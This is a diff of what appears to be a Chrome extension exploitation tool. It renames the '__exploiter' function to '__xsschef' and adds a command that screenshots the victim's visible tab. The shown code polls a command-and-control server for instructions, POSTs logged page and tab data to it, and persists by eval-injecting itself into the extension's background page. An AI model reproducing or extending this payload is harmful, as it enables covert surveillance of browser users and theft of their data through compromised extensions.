@@ -7,7 +7,7 @@ todo:
  - screenshots
 */
 
-function __exploiter() {
+function __xsschef() {
     // start scripts
     // this script gets executed in sheepchannel tab context, it's written here only for syntax highlighting & easy editing
     var sheepchannel_script = function(msg) {
@@ -28,7 +28,7 @@ function __exploiter() {
         switch (msg.cmd) {
             case 'log':
                 var x = new XMLHttpRequest();
-                x.open('POST', 'http://dev.localhost/exploiter/server.php?ch=xxx', true);
+                x.open('POST', 'http://dev.localhost/xsschef/server.php?ch=xxx', true);
                 x.send(JSON.stringify(msg.p));
             break;
         }
@@ -39,7 +39,7 @@ function __exploiter() {
         setInterval(function() {
             //console.log('polling for cmds');
             var x = new XMLHttpRequest();
-            x.open('GET', 'http://dev.localhost/exploiter/server.php?ch=xxx-cmd', true);
+            x.open('GET', 'http://dev.localhost/xsschef/server.php?ch=xxx-cmd', true);
             x.onreadystatechange = function () {
               if (x.readyState == 4 && x.status == 200) {
                 try {
@@ -146,6 +146,11 @@ function __exploiter() {
                 case 'ping':
                     log({type: 'pong', id: port.tab.id, url: port.tab.url});
                 break;
+                case 'screenshot':
+                    chrome.tabs.captureVisibleTab(null,null, function(data_url) {
+                        log({type:'recvscreenshot', url: data_url});
+                    });
+                break;
                 case 'report':
                     report_tabs();
                     report_page_info();
@@ -229,7 +234,7 @@ function __exploiter() {
 
 if (chrome.extension.getBackgroundPage()) {// try to persist in background page
     // chrome 18 csp fix - maybe add script to document.body? 
-    chrome.extension.getBackgroundPage().eval.apply(chrome.extension.getBackgroundPage(), [__exploiter.toString()+ ";__exploiter();"]);
+    chrome.extension.getBackgroundPage().eval.apply(chrome.extension.getBackgroundPage(), [__xsschef.toString()+ ";__xsschef();"]);
 } else {
-    __exploiter(); // no persistence :(
+    __xsschef(); // no persistence :(
 }
